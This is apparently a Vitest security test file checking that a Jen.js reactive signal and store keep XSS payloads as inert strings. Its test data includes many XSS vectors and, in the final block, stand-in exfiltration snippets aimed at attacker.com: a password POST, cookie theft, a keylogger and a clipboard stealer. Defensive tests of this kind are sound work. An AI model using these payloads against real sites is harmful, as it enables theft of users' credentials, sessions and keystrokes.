import { describe, it, expect } from "vitest";
import { signal, bindSignal, createStore } from "@src/client-routing/signal.js";

/**
 * XSS Security Tests for Client Routing & Reactive State
 * Simulating advanced hacker attempts to break into Jen.js
 */

describe("XSS Security - Advanced Attack Vectors", () => {
  describe("Signal Data Binding - Script Injection", () => {
    it("should not execute script tags in signal values", () => {
      const payload = signal('<script>alert("XSS")</script>');

      // Signal should store the string safely
      expect(payload.value).toContain("<script>");
      expect(typeof payload.value).toBe("string");

      // Should not execute JavaScript
      expect(payload.value).not.toMatch(/javascript:/);
    });

    it("should safely handle onload event injection", () => {
      const malicious = signal("<img src=x onerror=\"alert('XSS')\">");

      expect(malicious.value).toContain("onerror=");
      // String is stored as-is, not executed by signal itself
      expect(typeof malicious.value).toBe("string");
    });

    it("should not evaluate data: protocol URLs", () => {
      const payload = signal('data:text/html,<script>alert("XSS")</script>');

      expect(payload.value).toContain("data:text/html");
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute javascript: protocol", () => {
      const payload = signal('javascript:alert("XSS")');

      expect(payload.value).toContain("javascript:");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("DOM Binding - HTML Injection", () => {
    it("should treat innerHTML attempts as plain text via bindSignal", () => {
      const mockElement = { textContent: "" } as any;
      const attack = signal(
        "<img src=x onerror=\"fetch('http://attacker.com')\">",
      );

      // Simulate binding
      bindSignal(mockElement, attack);

      // Should set textContent, not innerHTML
      expect(mockElement.textContent).toContain("<img");
      // Text content doesn't execute JavaScript
      expect(mockElement.textContent).not.toBe("");
    });

    it("should prevent SVG XSS via signal values", () => {
      const svgAttack = signal(
        "<svg onload=\"fetch('http://attacker.com/steal-cookies')\">",
      );

      expect(svgAttack.value).toContain("onload=");
      // Signal stores string safely
      expect(typeof svgAttack.value).toBe("string");
    });

    it("should prevent mathml xss injection", () => {
      const mathAttack = signal(
        '<math><mtext><script>alert("XSS")</script></mtext></math>',
      );

      expect(mathAttack.value).toContain("<script>");
      expect(typeof mathAttack.value).toBe("string");
    });
  });

  describe("Event Handler Injection", () => {
    it("should not execute onclick handlers in signal values", () => {
      const payload = signal("onclick=\"fetch('http://attacker.com')\"");

      expect(payload.value).toContain("onclick=");
      // Signal doesn't auto-wire event handlers
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute onmouseover handlers", () => {
      const payload = signal('onmouseover="alert(document.cookie)"');

      expect(payload.value).toContain("onmouseover=");
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute oninput handlers", () => {
      const payload = signal("oninput=\"fetch('http://attacker.com')\"");

      expect(payload.value).toContain("oninput=");
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute onchange handlers", () => {
      const payload = signal(
        "onchange=\"window.location='http://attacker.com'\"",
      );

      expect(payload.value).toContain("onchange=");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("HTML Entity Encoding Bypass", () => {
    it("should not execute HTML-encoded script tags", () => {
      const encoded = signal(
        "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;",
      );

      expect(encoded.value).toContain("&lt;");
      expect(typeof encoded.value).toBe("string");
    });

    it("should not execute unicode-encoded handlers", () => {
      const unicode = signal(
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
      );

      expect(unicode.value).toContain("\\u003c");
      expect(typeof unicode.value).toBe("string");
    });

    it("should not execute HTML decimal entities", () => {
      const decimal = signal("&#60;script&#62;alert(1)&#60;/script&#62;");

      expect(decimal.value).toContain("&#60;");
      expect(typeof decimal.value).toBe("string");
    });

    it("should not execute HTML hex entities", () => {
      const hex = signal("&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;");

      expect(hex.value).toContain("&#x3c;");
      expect(typeof hex.value).toBe("string");
    });
  });

  describe("Store-based Attacks", () => {
    it("should safely store XSS payloads in store", () => {
      const store = createStore({
        username: "<img src=x onerror=\"alert('XSS')\">",
        bio: 'javascript:alert("XSS")',
        avatar: "data:text/html,<script>alert(1)</script>",
      });

      expect(store.username.value).toContain("<img");
      expect(store.bio.value).toContain("javascript:");
      expect(store.avatar.value).toContain("data:text/html");
    });

    it("should not execute stored XSS when updating store", () => {
      const store = createStore({ userInput: "" });

      const attacks = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<object data="data:text/html,<script>alert(1)</script>">',
      ];

      attacks.forEach((attack) => {
        store.userInput.value = attack;
        expect(store.userInput.value).toBe(attack);
        expect(typeof store.userInput.value).toBe("string");
      });
    });
  });

  describe("Template Injection via Signals", () => {
    it("should not evaluate template literals in signal values", () => {
      const payload = signal('${alert("XSS")}');

      expect(payload.value).toContain("${");
      expect(typeof payload.value).toBe("string");
    });

    it("should not evaluate template expressions", () => {
      const payload = signal('`<script>${"alert(1)"}</script>`');

      expect(payload.value).toContain("${");
      expect(typeof payload.value).toBe("string");
    });

    it("should not evaluate computed property names", () => {
      const payload = signal('{"[alert(1)]": "test"}');

      expect(payload.value).toContain("[alert");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("DOM Clobbering Attacks", () => {
    it("should handle id attribute hijacking safely", () => {
      const payload = signal('id="document" src="http://attacker.com"');

      expect(payload.value).toContain('id="document"');
      expect(typeof payload.value).toBe("string");
    });

    it("should handle form element hijacking safely", () => {
      const payload = signal('name="submit" onclick="alert(1)"');

      expect(payload.value).toContain('name="submit"');
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("URL-based XSS", () => {
    it("should not execute javascript: URLs in signal", () => {
      const url = signal("javascript:alert(document.domain)");

      expect(url.value).toContain("javascript:");
      expect(typeof url.value).toBe("string");
    });

    it("should not execute vbscript: URLs", () => {
      const url = signal("vbscript:msgbox(1)");

      expect(url.value).toContain("vbscript:");
      expect(typeof url.value).toBe("string");
    });

    it("should not execute data: URLs with HTML", () => {
      const url = signal(
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
      );

      expect(url.value).toContain("data:text/html");
      expect(typeof url.value).toBe("string");
    });

    it("should not execute blob: URLs with code", () => {
      const url = signal("blob:http://attacker.com/12345");

      expect(url.value).toContain("blob:");
      expect(typeof url.value).toBe("string");
    });
  });

  describe("CSS Injection via Signals", () => {
    it("should not execute CSS expressions", () => {
      const css = signal("width: expression(alert(1))");

      expect(css.value).toContain("expression");
      expect(typeof css.value).toBe("string");
    });

    it("should not execute CSS import attacks", () => {
      const css = signal('@import url("http://attacker.com/malware.css")');

      expect(css.value).toContain("@import");
      expect(typeof css.value).toBe("string");
    });

    it("should not execute CSS behavior attacks", () => {
      const css = signal("behavior: url(http://attacker.com/xss.htc)");

      expect(css.value).toContain("behavior:");
      expect(typeof css.value).toBe("string");
    });
  });

  describe("NoScript Bypass Attempts", () => {
    it("should not execute content in noscript tags", () => {
      const payload = signal(
        '<noscript><img src=x onerror="alert(1)"></noscript>',
      );

      expect(payload.value).toContain("<noscript>");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("Null Byte Injection", () => {
    it("should handle null bytes safely", () => {
      const payload = signal("test%00<script>alert(1)</script>");

      expect(payload.value).toContain("%00");
      expect(typeof payload.value).toBe("string");
    });

    it("should handle literal null bytes", () => {
      const payload = signal("test\x00<script>alert(1)</script>");

      expect(payload.value).toContain("test");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("DOM Property Pollution", () => {
    it("should not pollute global properties via signal", () => {
      const payload = signal('__proto__["alert"] = function() {}');

      expect(payload.value).toContain("__proto__");
      expect(typeof payload.value).toBe("string");
      // Signal itself doesn't execute the code
    });

    it("should not pollute constructor via signal", () => {
      const payload = signal('constructor["alert"] = function() {}');

      expect(payload.value).toContain("constructor");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("Advanced Encoding Attacks", () => {
    it("should not execute double-encoded payloads", () => {
      const payload = signal("%253Cscript%253Ealert(1)%253C/script%253E");

      expect(payload.value).toContain("%25");
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute mixed encoding attacks", () => {
      const payload = signal("%3Cscript&gt;alert%281%29%3C/script&gt;");

      expect(payload.value).toContain("%3C");
      expect(typeof payload.value).toBe("string");
    });

    it("should not execute UTF-8 BOM bypass", () => {
      const payload = signal("\ufeff<script>alert(1)</script>");

      expect(payload.value).toContain("<script>");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("Mutation XSS (mXSS)", () => {
    it("should handle DOM mutation safe-list bypass", () => {
      const payload = signal(
        '<svg><style><img src="</style><img src=x onerror=alert(1)>',
      );

      expect(payload.value).toContain("</style>");
      expect(typeof payload.value).toBe("string");
    });

    it("should handle table context mutations", () => {
      const payload = signal(
        "<table><tr><td><img src=x onerror=alert(1)></td></tr></table>",
      );

      expect(payload.value).toContain("<table>");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("Prototype Chain Attacks", () => {
    it("should not execute via Object.prototype pollution", () => {
      const obj = {
        custom: "value",
      };
      const payload = signal(JSON.stringify(obj));

      expect(payload.value).toContain("value");
      expect(typeof payload.value).toBe("string");
    });
  });

  describe("Signal Subscriber Attacks", () => {
    it("should safely handle errors from malicious subscribers", () => {
      const count = signal(0);

      const throwingSubscriber = () => {
        throw new Error("Malicious error");
      };

      count.subscribe(throwingSubscriber);

      // Should not throw when updating signal
      expect(() => {
        count.value = 1;
      }).not.toThrow();
    });

    it("should not allow subscriber to access internals", () => {
      const store = createStore({ secret: "password123" });

      let accessedValue = null;
      store.secret.subscribe(() => {
        accessedValue = store.secret.value;
      });

      store.secret.value = "new-value";

      expect(accessedValue).toBe("new-value");
      // Subscriber can only see public value
      expect(typeof accessedValue).toBe("string");
    });
  });

  describe("Store Injection Attacks", () => {
    it("should not allow prototype pollution via store creation", () => {
      const store = createStore({
        __proto__: { isAdmin: true },
        constructor: { isAdmin: true },
      });

      expect(store.__proto__).toBeDefined();
      // Should not pollute Object.prototype
      expect((Object.prototype as any).isAdmin).toBeUndefined();
    });
  });

  describe("Comparison - Safe Alternative", () => {
    it("should prefer textContent over innerHTML for binding", () => {
      // This test documents the security posture:
      // bindSignal uses textContent, which is safe
      const mockEl = { textContent: "" } as any;
      const xss = signal('<img src=x onerror="alert(1)">');

      bindSignal(mockEl, xss);

      // textContent is set (safe)
      expect(mockEl.textContent).toBe(xss.value);
      // No innerHTML would be called
      expect(mockEl.innerHTML).toBeUndefined();
    });
  });

  describe("Real-world Attack Scenarios", () => {
    it("should prevent credential stealing via signal", () => {
      const form = createStore({
        password: "user123",
        ssn: "123-45-6789",
      });

      // Attacker tries to inject exfiltration code
      const payload =
        'fetch("http://attacker.com/steal", {method:"POST", body:JSON.stringify({password:""})})';
      form.password.value = payload;

      // Password is stored as string, not executed
      expect(form.password.value).toContain("fetch");
      expect(typeof form.password.value).toBe("string");
    });

    it("should prevent session hijacking via signal", () => {
      const session = createStore({
        sessionId: "abc123def456",
        userId: "42",
      });

      const attackPayload =
        'window.location="http://attacker.com?sid="+document.cookie';
      session.sessionId.value = attackPayload;

      // Stored safely as string
      expect(session.sessionId.value).toContain("window.location");
      expect(typeof session.sessionId.value).toBe("string");
    });

    it("should prevent keylogger injection via signal", () => {
      const app = createStore({
        userInput: "",
      });

      const keylogger = `
        document.addEventListener('keypress', e => {
          fetch('http://attacker.com/log', {
            method: 'POST',
            body: JSON.stringify({key: e.key})
          })
        })
      `;

      app.userInput.value = keylogger;

      // Stored as string, not executed
      expect(app.userInput.value).toContain("addEventListener");
      expect(typeof app.userInput.value).toBe("string");
    });

    it("should prevent clipboard hijacking via signal", () => {
      const clipboard = createStore({
        data: "",
      });

      const hijack = `
        navigator.clipboard.readText().then(text => {
          fetch('http://attacker.com/clipboard', {
            method: 'POST',
            body: text
          })
        })
      `;

      clipboard.data.value = hijack;

      // Stored safely
      expect(clipboard.data.value).toContain("clipboard");
      expect(typeof clipboard.data.value).toBe("string");
    });
  });
});
